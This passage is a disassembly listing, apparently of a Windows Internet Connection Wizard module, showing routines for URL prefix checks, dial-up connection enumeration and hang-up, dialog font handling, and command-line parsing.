		call	?fStrNCmpI@@YAHPAG0I@Z ; fStrNCmpI(ushort *,ushort *,uint)
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10050FB
		push	6		; unsigned int
		push	offset aHttps	; "HTTPS:"
		push	esi		; unsigned __int16 *
		call	?fStrNCmpI@@YAHPAG0I@Z ; fStrNCmpI(ushort *,ushort *,uint)
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10050FB
		push	4		; unsigned int
		push	offset aFtp	; "FTP:"
		push	esi		; unsigned __int16 *
		call	?fStrNCmpI@@YAHPAG0I@Z ; fStrNCmpI(ushort *,ushort *,uint)
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10050FB
		push	7		; unsigned int
		push	offset aGopher	; "GOPHER:"
		push	esi		; unsigned __int16 *
		call	?fStrNCmpI@@YAHPAG0I@Z ; fStrNCmpI(ushort *,ushort *,uint)
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10050FB
		push	5		; unsigned int
		push	offset aFile	; "FILE:"
		push	esi		; unsigned __int16 *
		call	?fStrNCmpI@@YAHPAG0I@Z ; fStrNCmpI(ushort *,ushort *,uint)
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_10050FE

loc_10050FB:				; CODE XREF: IsURL(ushort *)+1Bj
					; IsURL(ushort *)+2Fj ...
		xor	eax, eax
		inc	eax

loc_10050FE:				; CODE XREF: IsURL(ushort *)+6Bj
		pop	esi
		pop	ebp
		retn
?IsURL@@YAHPAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl FindFirstWhiteSpace(unsigned __int16 *)
?FindFirstWhiteSpace@@YAHPAG@Z proc near ; CODE	XREF: My32ShellExecute(ushort *)+A9p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		xor	eax, eax
		cmp	word ptr [ecx],	22h
		jnz	short loc_1005146
		inc	eax
		xor	edx, edx
		mov	dx, [ecx+2]
		jmp	short loc_1005129
; ---------------------------------------------------------------------------

loc_100511F:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+27j
		test	dx, dx
		jz	short loc_1005131
		inc	eax
		mov	dx, [ecx+eax*2]

loc_1005129:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+17j
		cmp	dx, 22h
		jnz	short loc_100511F
		jmp	short loc_1005146
; ---------------------------------------------------------------------------

loc_1005131:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+1Cj
		push	offset aIcwconn2Findfi ; "ICWCONN2: FindFirstWhiteSpace	discovere"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx

loc_100513C:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+3Dj
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1005140:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+48j
		test	dx, dx
		jz	short loc_100513C
		inc	eax

loc_1005146:				; CODE XREF: FindFirstWhiteSpace(ushort	*)+Ej
					; FindFirstWhiteSpace(ushort *)+29j
		mov	dx, [ecx+eax*2]
		cmp	dx, 20h
		jnz	short loc_1005140
		pop	ebp
		retn
?FindFirstWhiteSpace@@YAHPAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl WaitForConnectionTermination(HRASCONN)
?WaitForConnectionTermination@@YAHPAUHRASCONN__@@@Z proc near
					; CODE XREF: HangUpAll(void)+79p
					; WinMain(x,x,x,x)+1C1p ...

var_134		= dword	ptr -134h
var_12C		= dword	ptr -12Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 134h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	[ebp+var_4], eax
		push	edi
		xor	ebx, ebx

loc_1005172:				; CODE XREF: WaitForConnectionTermination(HRASCONN__ *)+5Bj
		push	4Ch
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_134]
		rep stosd
		push	3E8h		; dwMilliseconds
		mov	[ebp+var_134], 130h
		call	ds:__imp__Sleep@4 ; Sleep(x)
		lea	eax, [ebp+var_134]
		push	eax		; struct tagRASCONNSTATUSW *
		push	esi		; HRASCONN
		inc	ebx
		call	_RasGetConnectStatusW@8	; RasGetConnectStatusW(x,x)
		test	eax, eax
		jnz	short loc_10051C4
		cmp	[ebp+var_12C], 6
		jz	short loc_10051B4
		cmp	ebx, 5
		jl	short loc_1005172

loc_10051B4:				; CODE XREF: WaitForConnectionTermination(HRASCONN__ *)+56j
		xor	eax, eax
		inc	eax

loc_10051B7:				; CODE XREF: WaitForConnectionTermination(HRASCONN__ *)+6Fj
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
; ---------------------------------------------------------------------------

loc_10051C4:				; CODE XREF: WaitForConnectionTermination(HRASCONN__ *)+4Dj
		xor	eax, eax
		jmp	short loc_10051B7
?WaitForConnectionTermination@@YAHPAUHRASCONN__@@@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; unsigned __int16 *__cdecl GetSz(unsigned __int16)
?GetSz@@YAPAGG@Z proc near		; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+2Fp
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+3Bp ...

arg_0		= word ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, ?iSzTable@@3HA ; int iSzTable
		shl	esi, 9
		add	esi, offset ?szStrTable@@3PAY0BAA@GA ; "Internet Connection Wizard"
		inc	?iSzTable@@3HA	; int iSzTable
		cmp	?iSzTable@@3HA,	5 ; int	iSzTable
		push	edi
		jl	short loc_10051F9
		and	?iSzTable@@3HA,	0 ; int	iSzTable

loc_10051F9:				; CODE XREF: GetSz(ushort)+23j
		movzx	edi, [ebp+arg_0]
		push	100h		; cchBufferMax
		push	esi		; lpBuffer
		push	edi		; uID
		push	0		; lpModuleName
		call	ds:__imp__GetModuleHandleW@4 ; GetModuleHandleW(x)
		push	eax		; hInstance
		call	ds:__imp__LoadStringW@16 ; LoadStringW(x,x,x,x)
		test	eax, eax
		jnz	short loc_1005228
		push	edi
		push	offset aConnect2Loadst ; "CONNECT2:LoadString failed %d\n"
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		and	word ptr [esi],	0
		pop	ecx
		pop	ecx

loc_1005228:				; CODE XREF: GetSz(ushort)+48j
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebp
		retn
?GetSz@@YAPAGG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ReleaseBold(HWND hWnd)
?ReleaseBold@@YAJPAUHWND__@@@Z proc near ; CODE	XREF: DialErrDlgProc(x,x,x,x)+733p
					; DialReallyCancelDlgProc(x,x,x,x)+8Ap	...

hWnd		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	0		; lParam
		push	0		; wParam
		push	31h		; Msg
		push	[ebp+hWnd]	; hWnd
		call	ds:__imp__SendMessageW@16 ; SendMessageW(x,x,x,x)
		test	eax, eax
		jz	short loc_1005252
		push	eax		; ho
		call	ds:__imp__DeleteObject@4 ; DeleteObject(x)

loc_1005252:				; CODE XREF: ReleaseBold(HWND__	*)+16j
		xor	eax, eax
		pop	ebp
		retn
?ReleaseBold@@YAJPAUHWND__@@@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl MakeBold(HWND hWnd, int, int)
?MakeBold@@YAJPAUHWND__@@HJ@Z proc near	; CODE XREF: DialErrDlgProc(x,x,x,x)+F7p
					; DialReallyCancelDlgProc(x,x,x,x)+53p	...

var_4		= dword	ptr -4
hWnd		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		xor	esi, esi
		cmp	[ebp+hWnd], esi
		mov	[ebp+var_4], esi
		jz	short loc_10052E9
		push	ebx
		push	edi
		mov	edi, ds:__imp__SendMessageW@16 ; SendMessageW(x,x,x,x)
		push	esi		; lParam
		push	esi		; wParam
		push	31h		; Msg
		push	[ebp+hWnd]	; hWnd
		call	edi ; SendMessageW(x,x,x,x) ; SendMessageW(x,x,x,x)
		mov	ebx, eax
		cmp	ebx, esi
		jz	short loc_10052D2
		push	5Ch		; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		mov	esi, eax
		test	esi, esi
		jz	short loc_10052D2
		push	esi		; pv
		push	5Ch		; c
		push	ebx		; h
		call	ds:__imp__GetObjectW@12	; GetObjectW(x,x,x)
		test	eax, eax
		jz	short loc_10052D2
		mov	ecx, [esi]
		mov	eax, ecx
		cdq
		xor	eax, edx
		sub	eax, edx
		cmp	eax, 18h
		jge	short loc_10052C1
		cmp	[ebp+arg_4], 0
		jz	short loc_10052C1
		mov	eax, ecx
		cdq
		push	4
		pop	ebx
		idiv	ebx
		add	eax, ecx
		mov	[esi], eax

loc_10052C1:				; CODE XREF: MakeBold(HWND__ *,int,long)+52j
					; MakeBold(HWND__ *,int,long)+58j
		mov	eax, [ebp+arg_8]
		push	esi		; lplf
		mov	[esi+10h], eax
		call	ds:__imp__CreateFontIndirectW@4	; CreateFontIndirectW(x)
		test	eax, eax
		jnz	short loc_10052DD

loc_10052D2:				; CODE XREF: MakeBold(HWND__ *,int,long)+26j
					; MakeBold(HWND__ *,int,long)+36j ...
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	[ebp+var_4], eax
		jmp	short loc_10052E7
; ---------------------------------------------------------------------------

loc_10052DD:				; CODE XREF: MakeBold(HWND__ *,int,long)+75j
		push	1		; lParam
		push	eax		; wParam
		push	30h		; Msg
		push	[ebp+hWnd]	; hWnd
		call	edi ; SendMessageW(x,x,x,x) ; SendMessageW(x,x,x,x)

loc_10052E7:				; CODE XREF: MakeBold(HWND__ *,int,long)+80j
		pop	edi
		pop	ebx

loc_10052E9:				; CODE XREF: MakeBold(HWND__ *,int,long)+Fj
		mov	eax, [ebp+var_4]
		pop	esi
		leave
		retn
?MakeBold@@YAJPAUHWND__@@HJ@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall DoneDlgProc(HWND, UINT, WPARAM, LPARAM)
_DoneDlgProc@16	proc near		; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *):loc_1005E54o

hDlg		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= word ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	edi
		xor	edi, edi
		inc	edi
		dec	eax
		dec	eax
		jz	loc_1005395
		sub	eax, 0Eh
		jz	short loc_1005385
		sub	eax, 100h
		jz	short loc_1005330
		dec	eax
		jnz	loc_10053AA
		movzx	eax, [ebp+arg_8]
		cmp	eax, 3F4h
		jz	short loc_100532D
		cmp	eax, 7E7h
		jnz	short loc_10053AC

loc_100532D:				; CODE XREF: DoneDlgProc(x,x,x,x)+30j
		push	eax
		jmp	short loc_100538A
; ---------------------------------------------------------------------------

loc_1005330:				; CODE XREF: DoneDlgProc(x,x,x,x)+1Ej
		push	esi
		push	2BCh		; int
		push	edi		; int
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?MakeBold@@YAJPAUHWND__@@HJ@Z ;	MakeBold(HWND__	*,int,long)
		add	esp, 0Ch
		push	offset ?pszINSFileName@@3PAGA ;	lpFileName
		push	0FFh		; nSize
		mov	esi, offset ?szBuff256@@3PAGA ;	ushort * szBuff256
		push	esi		; lpReturnedString
		push	offset Default	; lpDefault
		push	offset KeyName	; "Done_Message"
		push	offset AppName	; "ClientSetup"
		call	ds:__imp__GetPrivateProfileStringW@24 ;	GetPrivateProfileStringW(x,x,x,x,x,x)
		push	esi		; lpString
		push	3F3h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)
		pop	esi
		jmp	short loc_10053AC
; ---------------------------------------------------------------------------

loc_1005385:				; CODE XREF: DoneDlgProc(x,x,x,x)+17j
		push	3F4h		; nResult

loc_100538A:				; CODE XREF: DoneDlgProc(x,x,x,x)+3Aj
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__EndDialog@8 ;	EndDialog(x,x)
		jmp	short loc_10053AC
; ---------------------------------------------------------------------------

loc_1005395:				; CODE XREF: DoneDlgProc(x,x,x,x)+Ej
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?ReleaseBold@@YAJPAUHWND__@@@Z ; ReleaseBold(HWND__ *)
		pop	ecx

loc_10053AA:				; CODE XREF: DoneDlgProc(x,x,x,x)+21j
		xor	edi, edi

loc_10053AC:				; CODE XREF: DoneDlgProc(x,x,x,x)+37j
					; DoneDlgProc(x,x,x,x)+8Fj ...
		mov	eax, edi
		pop	edi
		pop	ebp
		retn	10h
_DoneDlgProc@16	endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall DoneRebootDlgProc(HWND, UINT, WPARAM, LPARAM)
_DoneRebootDlgProc@16 proc near		; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2C2o

hDlg		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= word ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	edi
		xor	edi, edi
		inc	edi
		dec	eax
		dec	eax
		jz	short loc_1005447
		sub	eax, 10Eh
		jz	short loc_10053F2
		dec	eax
		jnz	loc_100545C
		movzx	eax, [ebp+arg_8]
		cmp	eax, 10h
		jz	short loc_10053E6
		cmp	eax, 7E7h
		jnz	short loc_100545E

loc_10053E6:				; CODE XREF: DoneRebootDlgProc(x,x,x,x)+25j
		push	eax		; nResult
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__EndDialog@8 ;	EndDialog(x,x)
		jmp	short loc_100545E
; ---------------------------------------------------------------------------

loc_10053F2:				; CODE XREF: DoneRebootDlgProc(x,x,x,x)+15j
		push	esi
		push	2BCh		; int
		push	edi		; int
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?MakeBold@@YAJPAUHWND__@@HJ@Z ;	MakeBold(HWND__	*,int,long)
		add	esp, 0Ch
		push	offset ?pszINSFileName@@3PAGA ;	lpFileName
		push	0FFh		; nSize
		mov	esi, offset ?szBuff256@@3PAGA ;	ushort * szBuff256
		push	esi		; lpReturnedString
		push	offset Default	; lpDefault
		push	offset KeyName	; "Done_Message"
		push	offset AppName	; "ClientSetup"
		call	ds:__imp__GetPrivateProfileStringW@24 ;	GetPrivateProfileStringW(x,x,x,x,x,x)
		push	esi		; lpString
		push	3F3h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)
		pop	esi
		jmp	short loc_100545E
; ---------------------------------------------------------------------------

loc_1005447:				; CODE XREF: DoneRebootDlgProc(x,x,x,x)+Ej
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?ReleaseBold@@YAJPAUHWND__@@@Z ; ReleaseBold(HWND__ *)
		pop	ecx

loc_100545C:				; CODE XREF: DoneRebootDlgProc(x,x,x,x)+18j
		xor	edi, edi

loc_100545E:				; CODE XREF: DoneRebootDlgProc(x,x,x,x)+2Cj
					; DoneRebootDlgProc(x,x,x,x)+38j ...
		mov	eax, edi
		pop	edi
		pop	ebp
		retn	10h
_DoneRebootDlgProc@16 endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl HangUpAll()
?HangUpAll@@YAJXZ proc near		; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+28Fp
					; CallDownLoad(ushort *,HINSTANCE__ *):loc_1005EA0p

var_10		= dword	ptr -10h
dwBytes		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		push	edi
		mov	edi, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		mov	esi, 330h
		push	esi		; dwBytes
		push	40h		; uFlags
		mov	[ebp+var_10], 8
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		test	eax, eax
		jz	short loc_10054FF
		and	[ebp+var_8], 0
		push	ebx
		mov	ebx, ds:__imp__GlobalFree@4 ; GlobalFree(x)
		mov	[ebp+dwBytes], esi
		push	eax		; hMem
		mov	[eax], esi
		call	ebx ; GlobalFree(x) ; GlobalFree(x)
		push	[ebp+dwBytes]	; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	edi, eax
		test	edi, edi
		jz	short loc_10054FE
		mov	eax, [ebp+dwBytes]
		mov	[edi], eax
		lea	eax, [ebp+var_8]
		push	eax		; LPDWORD
		lea	eax, [ebp+dwBytes]
		push	eax		; LPDWORD
		push	edi		; struct tagRASCONNW *
		call	_RasEnumConnectionsW@12	; RasEnumConnectionsW(x,x,x)
		xor	eax, eax
		cmp	[ebp+var_8], eax
		jz	short loc_10054F7
		mov	[ebp+var_10], eax
		jbe	short loc_10054F7
		lea	eax, [edi+4]
		mov	[ebp+var_4], eax

loc_10054D4:				; CODE XREF: HangUpAll(void)+8Bj
		mov	eax, [ebp+var_4]
		push	dword ptr [eax]	; HRASCONN
		call	_RasHangUpW@4	; RasHangUpW(x)
		mov	eax, [ebp+var_4]
		push	dword ptr [eax]	; HRASCONN
		call	?WaitForConnectionTermination@@YAHPAUHRASCONN__@@@Z ; WaitForConnectionTermination(HRASCONN__ *)
		inc	[ebp+var_10]
		mov	eax, [ebp+var_10]
		add	[ebp+var_4], esi
		cmp	eax, [ebp+var_8]
		pop	ecx
		jb	short loc_10054D4

loc_10054F7:				; CODE XREF: HangUpAll(void)+5Dj
					; HangUpAll(void)+62j
		push	edi		; hMem
		call	ebx ; GlobalFree(x) ; GlobalFree(x)
		and	[ebp+var_10], 0

loc_10054FE:				; CODE XREF: HangUpAll(void)+43j
		pop	ebx

loc_10054FF:				; CODE XREF: HangUpAll(void)+23j
		mov	eax, [ebp+var_10]
		pop	edi
		pop	esi
		leave
		retn
?HangUpAll@@YAJXZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl FShouldRetry(__int32)
?FShouldRetry@@YAHJ@Z proc near		; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+1FCp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		cmp	eax, 2A4h
		jz	short loc_100555D
		cmp	eax, 2A5h
		jz	short loc_100555D
		cmp	eax, 2A6h
		jz	short loc_100555D
		cmp	eax, 2A7h
		jz	short loc_100555D
		cmp	eax, 2B3h
		jz	short loc_100555D
		cmp	eax, 2CEh
		jz	short loc_100555D
		cmp	eax, 275h
		jz	short loc_100555D
		cmp	eax, 285h
		jz	short loc_100555D
		cmp	eax, 2DBh
		jz	short loc_100555D
		cmp	eax, 2D0h
		jz	short loc_100555D
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100555D:				; CODE XREF: FShouldRetry(long)+Dj
					; FShouldRetry(long)+14j ...
		xor	eax, eax
		inc	eax
		pop	ebp
		retn
?FShouldRetry@@YAHJ@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl FindCurrentConn()
?FindCurrentConn@@YAJXZ	proc near	; CODE XREF: WinMain(x,x,x,x):loc_1006133p

var_10		= dword	ptr -10h
lpString1	= dword	ptr -0Ch
dwBytes		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		and	[ebp+var_4], 0
		push	ebx
		mov	ebx, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		push	esi
		push	edi
		mov	esi, 330h
		push	esi		; dwBytes
		push	40h		; uFlags
		mov	[ebp+dwBytes], esi
		mov	[ebp+var_10], 8
		call	ebx ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	edi, eax
		test	edi, edi
		jz	loc_1005652
		lea	eax, [ebp+var_4]
		push	eax		; LPDWORD
		lea	eax, [ebp+dwBytes]
		push	eax		; LPDWORD
		push	edi		; struct tagRASCONNW *
		mov	[edi], esi
		call	_RasEnumConnectionsW@12	; RasEnumConnectionsW(x,x,x)
		test	eax, eax
		jz	short loc_10055D4
		push	edi		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		push	[ebp+dwBytes]	; dwBytes
		push	40h		; uFlags
		call	ebx ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	edi, eax
		test	edi, edi
		jz	loc_1005652
		lea	eax, [ebp+var_4]
		push	eax		; LPDWORD
		lea	eax, [ebp+dwBytes]
		push	eax		; LPDWORD
		push	edi		; struct tagRASCONNW *
		call	_RasEnumConnectionsW@12	; RasEnumConnectionsW(x,x,x)

loc_10055D4:				; CODE XREF: FindCurrentConn(void)+45j
		xor	ebx, ebx
		cmp	?pszFinalConnectoid@@3PAGA, bx ; ushort	* pszFinalConnectoid
		jz	short loc_1005626
		cmp	[ebp+var_4], ebx
		jz	short loc_1005647
		cmp	[ebp+var_4], ebx
		jbe	short loc_100561B
		lea	eax, [edi+8]
		mov	[ebp+lpString1], eax

loc_10055EF:				; CODE XREF: FindCurrentConn(void)+A1j
		push	offset ?pszFinalConnectoid@@3PAGA ; lpString2
		push	[ebp+lpString1]	; lpString1
		call	ds:__imp__lstrcmpiW@8 ;	lstrcmpiW(x,x)
		test	eax, eax
		jz	short loc_100560C
		add	[ebp+lpString1], esi
		inc	ebx
		cmp	ebx, [ebp+var_4]
		jb	short loc_10055EF
		jmp	short loc_100561B
; ---------------------------------------------------------------------------

loc_100560C:				; CODE XREF: FindCurrentConn(void)+98j
		imul	ebx, 330h
		mov	eax, [ebx+edi+4]
		mov	?hrasconn@@3PAUHRASCONN__@@A, eax ; HRASCONN__ * hrasconn

loc_100561B:				; CODE XREF: FindCurrentConn(void)+80j
					; FindCurrentConn(void)+A3j
		cmp	?hrasconn@@3PAUHRASCONN__@@A, 0	; HRASCONN__ * hrasconn
		jz	short loc_100564B
		jmp	short loc_1005647
; ---------------------------------------------------------------------------

loc_1005626:				; CODE XREF: FindCurrentConn(void)+76j
		cmp	[ebp+var_4], ebx
		jz	short loc_1005647
		push	105h		; iMaxLength
		lea	eax, [edi+8]
		push	eax		; lpString2
		push	offset ?pszFinalConnectoid@@3PAGA ; lpString1
		call	ds:__imp__lstrcpynW@12 ; lstrcpynW(x,x,x)
		mov	eax, [edi+4]
		mov	?hrasconn@@3PAUHRASCONN__@@A, eax ; HRASCONN__ * hrasconn

loc_1005647:				; CODE XREF: FindCurrentConn(void)+7Bj
					; FindCurrentConn(void)+BDj ...
		and	[ebp+var_10], 0

loc_100564B:				; CODE XREF: FindCurrentConn(void)+BBj
		push	edi		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1005652:				; CODE XREF: FindCurrentConn(void)+2Dj
					; FindCurrentConn(void)+59j
		mov	eax, [ebp+var_10]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
?FindCurrentConn@@YAJXZ	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl CopyCmdLineData(wchar_t *Str, wchar_t *lpString, int)
?CopyCmdLineData@@YAJPAG00@Z proc near	; CODE XREF: ParseCommandLine(ushort *)+31p
					; ParseCommandLine(ushort *)+50p

Str		= dword	ptr  8
lpString	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	[ebp+lpString]	; SubStr
		xor	edi, edi
		push	[ebp+Str]	; Str
		call	_wcsstr
		mov	esi, eax
		cmp	esi, edi
		pop	ecx
		pop	ecx
		jz	short loc_10056CC
		push	[ebp+lpString]	; lpString
		call	ds:__imp__lstrlenW@4 ; lstrlenW(x)
		mov	ecx, [ebp+arg_8]
		mov	[ecx], di
		lea	eax, [esi+eax*2]
		mov	edx, ecx
		xor	ecx, ecx
		cmp	word ptr [eax],	22h
		setz	cl
		mov	esi, ecx
		cmp	esi, edi
		jz	short loc_10056BF
		inc	eax
		inc	eax
		jmp	short loc_10056BF
; ---------------------------------------------------------------------------

loc_10056A2:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+66j
		cmp	cx, 20h
		jz	short loc_10056AC
		cmp	esi, edi
		jz	short loc_10056B6

loc_10056AC:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+47j
		cmp	cx, 22h
		jz	short loc_10056C7
		cmp	esi, edi
		jz	short loc_10056C7

loc_10056B6:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+4Bj
		mov	[edx], cx
		inc	edx
		inc	edx
		inc	eax
		inc	eax
		xor	ecx, ecx

loc_10056BF:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+3Dj
					; CopyCmdLineData(ushort *,ushort *,ushort *)+41j
		mov	cx, [eax]
		cmp	cx, di
		jnz	short loc_10056A2

loc_10056C7:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+51j
					; CopyCmdLineData(ushort *,ushort *,ushort *)+55j
		mov	[edx], di
		jmp	short loc_10056CF
; ---------------------------------------------------------------------------

loc_10056CC:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+1Aj
		push	57h
		pop	edi

loc_10056CF:				; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+6Bj
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn
?CopyCmdLineData@@YAJPAG00@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ParseCommandLine(LPWSTR Str)
?ParseCommandLine@@YAJPAG@Z proc near	; CODE XREF: WinMain(x,x,x,x)+84p

Str		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+Str]
		push	esi		; lpsz
		call	ds:__imp__CharUpperW@4 ; CharUpperW(x)
		push	offset SubStr	; "/REBOOT"
		push	esi		; Str
		call	_wcsstr
		neg	eax
		push	offset ?pszFinalConnectoid@@3PAGA ; int
		sbb	eax, eax
		neg	eax
		push	offset String	; "/CONNECTOID:"
		push	esi		; Str
		mov	?g_fNeedReboot@@3KA, eax ; ulong g_fNeedReboot
		call	?CopyCmdLineData@@YAJPAG00@Z ; CopyCmdLineData(ushort *,ushort *,ushort	*)
		add	esp, 14h
		test	eax, eax
		jz	short loc_100571F
		and	?pszFinalConnectoid@@3PAGA, 0 ;	ushort * pszFinalConnectoid

loc_100571F:				; CODE XREF: ParseCommandLine(ushort *)+3Bj
		push	offset ?pszINSFileName@@3PAGA ;	int
		push	offset aIns	; "/INS:"
		push	esi		; Str
		call	?CopyCmdLineData@@YAJPAG00@Z ; CopyCmdLineData(ushort *,ushort *,ushort	*)
		add	esp, 0Ch
		pop	esi
		pop	ebp
		retn
?ParseCommandLine@@YAJPAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl DeleteFileKindaLikeThisOne(LPCWSTR lpString)
?DeleteFileKindaLikeThisOne@@YAJPAG@Z proc near	; CODE XREF: WinMain(x,x,x,x)+26Cp

var_670		= dword	ptr -670h
lpString1	= dword	ptr -66Ch
FindFileData	= _WIN32_FIND_DATAW ptr	-668h
FileName	= word ptr -418h
String2		= word ptr -20Ch
var_4		= dword	ptr -4
lpString	= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 670h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, [ebp+lpString]
		push	edi
		xor	edi, edi
		cmp	esi, edi
		mov	[ebp+var_4], eax
		mov	[ebp+var_670], edi
		mov	[ebp+lpString1], edi
		jz	loc_10058BE
		mov	ebx, ds:__imp__lstrlenW@4 ; lstrlenW(x)
